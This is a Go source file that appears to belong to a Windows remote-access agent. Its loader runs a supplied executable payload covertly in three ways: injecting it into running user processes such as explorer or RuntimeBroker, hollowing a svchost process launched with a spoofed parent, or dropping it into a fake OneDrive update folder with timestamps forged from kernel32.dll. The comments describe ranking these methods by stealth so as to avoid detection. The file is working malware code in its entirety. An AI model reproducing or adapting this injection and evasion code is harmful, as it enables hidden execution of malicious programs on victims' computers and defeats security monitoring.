//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
	"overlord-client/cmd/agent/evasion"
)

// loadPayload tries injection methods in order of stealth:
//  1. Inject PE into an existing low-risk process (no new process event).
//  2. Classic process hollowing into a new suspended svchost.
//  3. Drop to disk and exec (noisiest, last resort).
func loadPayload(payload []byte) {
	evasion.InitLoader()
	if err := injectExisting(payload); err == nil {
		return
	}
	if err := hollowLoad(payload); err != nil {
		dropAndExec(payload)
	}
}

func hollowLoad(payload []byte) error {
	if len(payload) < 0x40 {
		return fmt.Errorf("payload too small")
	}
	if payload[0] != 0x4d || payload[1] != 0x5a {
		return fmt.Errorf("not a PE")
	}
	eLfanew := int(binary.LittleEndian.Uint32(payload[0x3c:]))
	if eLfanew+24 > len(payload) || binary.LittleEndian.Uint32(payload[eLfanew:]) != 0x00004550 {
		return fmt.Errorf("invalid PE")
	}
	machine := binary.LittleEndian.Uint16(payload[eLfanew+4:])
	if machine != 0x8664 {
		return fmt.Errorf("only AMD64 PE supported")
	}

	optOff := eLfanew + 24
	imageBase := binary.LittleEndian.Uint64(payload[optOff+24:])
	entryRVA := binary.LittleEndian.Uint32(payload[optOff+16:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOff+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOff+60:])
	numSections := int(binary.LittleEndian.Uint16(payload[eLfanew+6:]))
	sizeOfOptHdr := int(binary.LittleEndian.Uint16(payload[eLfanew+20:]))
	sectTableOff := eLfanew + 24 + sizeOfOptHdr

	relocRVA := uint32(0)
	relocSize := uint32(0)
	if optOff+168 <= len(payload) {
		relocRVA = binary.LittleEndian.Uint32(payload[optOff+160:])
		relocSize = binary.LittleEndian.Uint32(payload[optOff+164:])
	}

	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	hostExe := filepath.Join(sysRoot, "System32", "svchost.exe")
	hostExePtr, _ := windows.UTF16PtrFromString(hostExe + " -k netsvcs")

	// Build STARTUPINFOEX with PPID spoof: svchost will appear as a child of explorer.
	var siEx windows.StartupInfoEx
	siEx.StartupInfo.Cb = uint32(unsafe.Sizeof(siEx))
	createFlags := uint32(windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW)

	explorerPID := findExplorerPID()
	var attrList *windows.ProcThreadAttributeListContainer
	if explorerPID != 0 {
		parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, explorerPID)
		if err == nil {
			defer windows.CloseHandle(parentHandle)
			attrList, _ = windows.NewProcThreadAttributeList(1)
			if attrList != nil {
				defer attrList.Delete()
				_ = attrList.Update(
					windows.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
					unsafe.Pointer(&parentHandle),
					unsafe.Sizeof(parentHandle),
				)
				siEx.ProcThreadAttributeList = attrList.List()
				createFlags |= windows.EXTENDED_STARTUPINFO_PRESENT
			}
		}
	}

	var pi windows.ProcessInformation
	if err := windows.CreateProcess(
		nil, hostExePtr, nil, nil, false,
		createFlags, nil, nil, &siEx.StartupInfo, &pi,
	); err != nil {
		return fmt.Errorf("CreateProcess: %w", err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// Get PEB base and current image base of the suspended process.
	pebBase := evasion.ProcessPEB(uintptr(pi.Process))
	if pebBase == 0 {
		return fmt.Errorf("ProcessPEB failed")
	}
	remoteBase := evasion.ProcessImageBase(uintptr(pi.Process))

	// Unmap the existing image from the target address space.
	evasion.NtUnmapViewOfSection(uintptr(pi.Process), remoteBase)

	// Allocate RW memory at the preferred base; fall back to any address.
	allocBase := evasion.NtAllocateVirtualMemoryAt(
		uintptr(pi.Process), uintptr(imageBase), uintptr(sizeOfImage), windows.PAGE_READWRITE)
	if allocBase == 0 {
		allocBase = evasion.NtAllocateVirtualMemoryAt(
			uintptr(pi.Process), 0, uintptr(sizeOfImage), windows.PAGE_READWRITE)
	}
	if allocBase == 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed")
	}

	// Write PE headers.
	if !evasion.NtWriteRemote(uintptr(pi.Process), allocBase, payload[:sizeOfHeaders]) {
		return fmt.Errorf("write headers failed")
	}

	// Write sections.
	for i := 0; i < numSections; i++ {
		secOff := sectTableOff + i*40
		if secOff+40 > len(payload) {
			break
		}
		virtualAddr := binary.LittleEndian.Uint32(payload[secOff+12:])
		rawSize := binary.LittleEndian.Uint32(payload[secOff+16:])
		rawPtr := binary.LittleEndian.Uint32(payload[secOff+20:])
		if rawSize == 0 || int(rawPtr+rawSize) > len(payload) {
			continue
		}
		evasion.NtWriteRemote(uintptr(pi.Process),
			allocBase+uintptr(virtualAddr),
			payload[rawPtr:rawPtr+rawSize])
	}

	// Apply base relocations (while allocation is still RW).
	delta := int64(allocBase) - int64(imageBase)
	if delta != 0 && relocRVA != 0 && relocSize != 0 {
		relocRaw := rvaToRaw(payload, sectTableOff, numSections, relocRVA)
		if relocRaw > 0 && relocRaw+int(relocSize) <= len(payload) {
			applyRelocs(pi.Process,
				payload[relocRaw:relocRaw+int(relocSize)],
				allocBase, delta)
		}
	}

	// Flip headers to read-only, then each section to its proper protection.
	evasion.NtProtectRemote(uintptr(pi.Process), allocBase, uintptr(sizeOfHeaders), windows.PAGE_READONLY)
	for i := 0; i < numSections; i++ {
		secOff := sectTableOff + i*40
		if secOff+40 > len(payload) {
			break
		}
		virtualAddr := binary.LittleEndian.Uint32(payload[secOff+12:])
		virtualSize := binary.LittleEndian.Uint32(payload[secOff+8:])
		if virtualSize == 0 {
			virtualSize = binary.LittleEndian.Uint32(payload[secOff+16:])
		}
		chars := binary.LittleEndian.Uint32(payload[secOff+36:])
		prot := sectionProtect(chars)
		evasion.NtProtectRemote(uintptr(pi.Process), allocBase+uintptr(virtualAddr), uintptr(virtualSize), prot)
	}

	// Update PEB.ImageBaseAddress to the new allocation.
	var newBase [8]byte
	binary.LittleEndian.PutUint64(newBase[:], uint64(allocBase))
	evasion.NtWriteRemote(uintptr(pi.Process), pebBase+0x10, newBase[:])

	// Redirect the main thread's RIP to our entry point.
	// AMD64 CONTEXT is 1232 bytes and must be 16-byte aligned.
	ctxRaw := make([]byte, 1232+16)
	align := uintptr(16) - (uintptr(unsafe.Pointer(&ctxRaw[0])) & 15)
	if align == 16 {
		align = 0
	}
	ctx := ctxRaw[align : align+1232]
	binary.LittleEndian.PutUint32(ctx[48:], 0x10003f) // ContextFlags = CONTEXT_FULL (AMD64)
	evasion.NtGetContextThread(uintptr(pi.Thread), unsafe.Pointer(&ctx[0]))
	entryAddr := allocBase + uintptr(entryRVA)
	binary.LittleEndian.PutUint64(ctx[248:], uint64(entryAddr)) // Rip at offset 248
	evasion.NtSetContextThread(uintptr(pi.Thread), unsafe.Pointer(&ctx[0]))

	windows.ResumeThread(pi.Thread)
	return nil
}

// sectionProtect maps PE section characteristic flags to a Windows page protection constant.
func sectionProtect(chars uint32) uint32 {
	const (
		imgX = 0x20000000 // IMAGE_SCN_MEM_EXECUTE
		imgW = 0x80000000 // IMAGE_SCN_MEM_WRITE
	)
	exec := chars&imgX != 0
	write := chars&imgW != 0
	switch {
	case exec && write:
		return windows.PAGE_EXECUTE_READWRITE
	case exec:
		return windows.PAGE_EXECUTE_READ
	case write:
		return windows.PAGE_READWRITE
	default:
		return windows.PAGE_READONLY
	}
}

// rvaToRaw converts a virtual address (RVA) to a raw file offset using the section table.
func rvaToRaw(payload []byte, sectTableOff, numSections int, rva uint32) int {
	for i := 0; i < numSections; i++ {
		off := sectTableOff + i*40
		if off+40 > len(payload) {
			break
		}
		virtualAddr := binary.LittleEndian.Uint32(payload[off+12:])
		virtualSize := binary.LittleEndian.Uint32(payload[off+8:])
		rawPtr := binary.LittleEndian.Uint32(payload[off+20:])
		if rva >= virtualAddr && rva < virtualAddr+virtualSize {
			return int(rawPtr + rva - virtualAddr)
		}
	}
	return 0
}

// applyRelocs patches base relocation entries in the remote process.
func applyRelocs(process windows.Handle, relocData []byte, allocBase uintptr, delta int64) {
	var buf [8]byte
	pos := 0
	for pos+8 <= len(relocData) {
		blockRVA := binary.LittleEndian.Uint32(relocData[pos:])
		blockSize := binary.LittleEndian.Uint32(relocData[pos+4:])
		if blockSize < 8 {
			break
		}
		numEntries := int(blockSize-8) / 2
		for i := 0; i < numEntries; i++ {
			if pos+8+i*2+2 > len(relocData) {
				break
			}
			entry := binary.LittleEndian.Uint16(relocData[pos+8+i*2:])
			relType := entry >> 12
			relOff := entry & 0x0fff
			if relType == 10 { // IMAGE_REL_BASED_DIR64
				addr := allocBase + uintptr(blockRVA) + uintptr(relOff)
				if evasion.NtReadRemote(uintptr(process), addr, buf[:]) {
					orig := binary.LittleEndian.Uint64(buf[:])
					orig = uint64(int64(orig) + delta)
					binary.LittleEndian.PutUint64(buf[:], orig)
					evasion.NtWriteRemote(uintptr(process), addr, buf[:])
				}
			}
		}
		pos += int(blockSize)
	}
}

// dropAndExec: fallback when hollowing fails. Writes to a random APPDATA path and executes.
func dropAndExec(payload []byte) {
	appdata := os.Getenv("LOCALAPPDATA")
	if appdata == "" {
		appdata = os.Getenv("APPDATA")
	}
	if appdata == "" {
		appdata = os.TempDir()
	}
	dir := filepath.Join(appdata, `Microsoft\OneDrive\Update`)
	_ = os.MkdirAll(dir, 0755)
	tmpPath := dir + `\` + randName() + ".exe"
	if err := os.WriteFile(tmpPath, payload, 0755); err != nil {
		return
	}
	stompFileTime(tmpPath)
	cmdPtr, err := windows.UTF16PtrFromString(tmpPath)
	if err != nil {
		return
	}
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation
	_ = windows.CreateProcess(nil, cmdPtr, nil, nil, false,
		windows.CREATE_NO_WINDOW, nil, nil, &si, &pi)
}

func randName() string {
	p := make([]byte, 6)
	x := uintptr(unsafe.Pointer(&p[0]))
	const hx = "0123456789abcdef"
	out := make([]byte, 12)
	for i := range out {
		out[i] = hx[x&0xf]
		x >>= 4
	}
	return string(out)
}

// injectExisting finds a running low-risk host process and injects the payload
// PE into it — no new process event is generated.
func injectExisting(payload []byte) error {
	if len(payload) < 0x40 || payload[0] != 0x4d || payload[1] != 0x5a {
		return fmt.Errorf("not a PE")
	}
	eLfanew := int(binary.LittleEndian.Uint32(payload[0x3c:]))
	if eLfanew+24 > len(payload) {
		return fmt.Errorf("bad PE")
	}
	optOff := eLfanew + 24
	imageBase := binary.LittleEndian.Uint64(payload[optOff+24:])
	entryRVA := binary.LittleEndian.Uint32(payload[optOff+16:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOff+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOff+60:])
	numSections := int(binary.LittleEndian.Uint16(payload[eLfanew+6:]))
	sizeOfOptHdr := int(binary.LittleEndian.Uint16(payload[eLfanew+20:]))
	sectTableOff := eLfanew + 24 + sizeOfOptHdr
	relocRVA, relocSize := uint32(0), uint32(0)
	if optOff+168 <= len(payload) {
		relocRVA = binary.LittleEndian.Uint32(payload[optOff+160:])
		relocSize = binary.LittleEndian.Uint32(payload[optOff+164:])
	}

	pid, err := findHostPID()
	if err != nil {
		return err
	}

	const injectAccess = windows.PROCESS_CREATE_THREAD | windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ | windows.PROCESS_QUERY_INFORMATION
	proc, err := windows.OpenProcess(injectAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess: %w", err)
	}
	defer windows.CloseHandle(proc)

	// Allocate RW at preferred base, fall back to any address.
	allocBase := evasion.NtAllocateVirtualMemoryAt(
		uintptr(proc), uintptr(imageBase), uintptr(sizeOfImage), windows.PAGE_READWRITE)
	if allocBase == 0 {
		allocBase = evasion.NtAllocateVirtualMemoryAt(
			uintptr(proc), 0, uintptr(sizeOfImage), windows.PAGE_READWRITE)
	}
	if allocBase == 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed in target")
	}

	// Write PE headers and sections while memory is RW.
	evasion.NtWriteRemote(uintptr(proc), allocBase, payload[:sizeOfHeaders])
	for i := 0; i < numSections; i++ {
		secOff := sectTableOff + i*40
		if secOff+40 > len(payload) {
			break
		}
		va := binary.LittleEndian.Uint32(payload[secOff+12:])
		rawSz := binary.LittleEndian.Uint32(payload[secOff+16:])
		rawPtr := binary.LittleEndian.Uint32(payload[secOff+20:])
		if rawSz == 0 || int(rawPtr+rawSz) > len(payload) {
			continue
		}
		evasion.NtWriteRemote(uintptr(proc), allocBase+uintptr(va), payload[rawPtr:rawPtr+rawSz])
	}

	// Apply relocations while still RW.
	delta := int64(allocBase) - int64(imageBase)
	if delta != 0 && relocRVA != 0 && relocSize != 0 {
		relocRaw := rvaToRaw(payload, sectTableOff, numSections, relocRVA)
		if relocRaw > 0 && relocRaw+int(relocSize) <= len(payload) {
			applyRelocs(proc, payload[relocRaw:relocRaw+int(relocSize)], allocBase, delta)
		}
	}

	// Flip to per-section protections (no RWX allocation at rest).
	evasion.NtProtectRemote(uintptr(proc), allocBase, uintptr(sizeOfHeaders), windows.PAGE_READONLY)
	for i := 0; i < numSections; i++ {
		secOff := sectTableOff + i*40
		if secOff+40 > len(payload) {
			break
		}
		virtualAddr := binary.LittleEndian.Uint32(payload[secOff+12:])
		virtualSize := binary.LittleEndian.Uint32(payload[secOff+8:])
		if virtualSize == 0 {
			virtualSize = binary.LittleEndian.Uint32(payload[secOff+16:])
		}
		chars := binary.LittleEndian.Uint32(payload[secOff+36:])
		prot := sectionProtect(chars)
		evasion.NtProtectRemote(uintptr(proc), allocBase+uintptr(virtualAddr), uintptr(virtualSize), prot)
	}

	entryAddr := allocBase + uintptr(entryRVA)
	th := evasion.NtCreateThreadEx(uintptr(proc), entryAddr)
	if th == 0 {
		return fmt.Errorf("NtCreateThreadEx failed")
	}
	windows.CloseHandle(windows.Handle(th))
	return nil
}

// candidateProcesses are benign host targets for thread injection, ordered by preference.
// All run as the current user (no elevation needed to open them).
var candidateProcesses = []string{
	"RuntimeBroker.exe",
	"SearchHost.exe",
	"SearchIndexer.exe",
	"explorer.exe",
	"sihost.exe",
	"ctfmon.exe",
	"dllhost.exe",
}

// iterProcs enumerates all accessible process handles via NtGetNextProcess,
// calling fn for each. fn returns false to stop early; each handle is closed automatically.
func iterProcs(access uint32, fn func(windows.Handle) bool) {
	var prev uintptr
	for {
		cur := evasion.NtGetNextProcess(prev, access)
		if prev != 0 {
			windows.CloseHandle(windows.Handle(prev))
		}
		if cur == 0 {
			break
		}
		if !fn(windows.Handle(cur)) {
			windows.CloseHandle(windows.Handle(cur))
			break
		}
		prev = cur
	}
}

// findHostPID returns the PID of the first running candidate process that
// we can open with VM + thread rights.
func findHostPID() (uint32, error) {
	type pe struct {
		pid  uint32
		name string
	}
	var procs []pe
	buf := make([]uint16, windows.MAX_PATH)

	iterProcs(windows.PROCESS_QUERY_LIMITED_INFORMATION, func(h windows.Handle) bool {
		size := uint32(len(buf))
		if windows.QueryFullProcessImageName(h, 0, &buf[0], &size) != nil {
			return true
		}
		pid := evasion.ProcessPID(uintptr(h))
		if pid != 0 {
			name := filepath.Base(windows.UTF16ToString(buf[:size]))
			procs = append(procs, pe{pid, name})
		}
		return true
	})

	const injectAccess = uint32(windows.PROCESS_CREATE_THREAD | windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE | windows.PROCESS_QUERY_INFORMATION)

	for _, candidate := range candidateProcesses {
		for _, p := range procs {
			if equalFold(p.name, candidate) {
				h, err := windows.OpenProcess(injectAccess, false, p.pid)
				if err == nil {
					windows.CloseHandle(h)
					return p.pid, nil
				}
			}
		}
	}
	return 0, fmt.Errorf("no suitable host process found")
}

// findExplorerPID returns the PID of the first explorer.exe instance accessible
// to the current user, used for PPID spoofing.
func findExplorerPID() uint32 {
	var pid uint32
	buf := make([]uint16, windows.MAX_PATH)

	iterProcs(windows.PROCESS_QUERY_LIMITED_INFORMATION, func(h windows.Handle) bool {
		size := uint32(len(buf))
		if windows.QueryFullProcessImageName(h, 0, &buf[0], &size) != nil {
			return true
		}
		name := filepath.Base(windows.UTF16ToString(buf[:size]))
		if equalFold(name, "explorer.exe") {
			pid = evasion.ProcessPID(uintptr(h))
			return false // stop
		}
		return true
	})
	return pid
}

// stompFileTime copies kernel32.dll timestamps onto path to blend with system files.
func stompFileTime(path string) {
	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	ref := filepath.Join(sysRoot, `System32\kernel32.dll`)
	rp, err := windows.UTF16PtrFromString(ref)
	if err != nil {
		return
	}
	rh, err := windows.CreateFile(rp, windows.GENERIC_READ, windows.FILE_SHARE_READ,
		nil, windows.OPEN_EXISTING, windows.FILE_FLAG_BACKUP_SEMANTICS, 0)
	if err != nil {
		return
	}
	defer windows.CloseHandle(rh)
	var cT, aT, wT windows.Filetime
	if err := windows.GetFileTime(rh, &cT, &aT, &wT); err != nil {
		return
	}
	tp, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	th, err := windows.CreateFile(tp,
		windows.FILE_WRITE_ATTRIBUTES, windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil, windows.OPEN_EXISTING, windows.FILE_FLAG_BACKUP_SEMANTICS, 0)
	if err != nil {
		return
	}
	defer windows.CloseHandle(th)
	_ = windows.SetFileTime(th, &cT, &aT, &wT)
}

// equalFold is a simple ASCII case-insensitive comparison to avoid importing strings.
func equalFold(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		ca, cb := a[i], b[i]
		if ca >= 'A' && ca <= 'Z' {
			ca += 32
		}
		if cb >= 'A' && cb <= 'Z' {
			cb += 32
		}
		if ca != cb {
			return false
		}
	}
	return true
}
